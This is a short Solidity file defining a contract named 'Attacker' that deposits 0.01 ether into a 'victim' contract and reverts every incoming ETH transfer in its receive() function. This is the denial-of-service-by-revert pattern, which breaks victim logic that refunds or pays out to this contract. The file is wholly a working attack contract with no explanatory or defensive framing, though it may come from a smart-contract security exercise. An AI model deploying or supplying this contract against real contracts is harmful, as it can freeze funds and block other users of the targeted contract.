// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface victim {
    function deposit() external payable ;
}
contract Attacker{
    victim vic;
    constructor(address addr) {
        vic = victim(addr);
    }
    
    function depositETH() public payable {}

    function depositToVictim() public payable{
        vic.deposit{value: 0.01 ether}();
    }
    // Whenever ETH is send to this contract by another contract it always reverts.
    receive() external payable { 
        revert();
    }
}
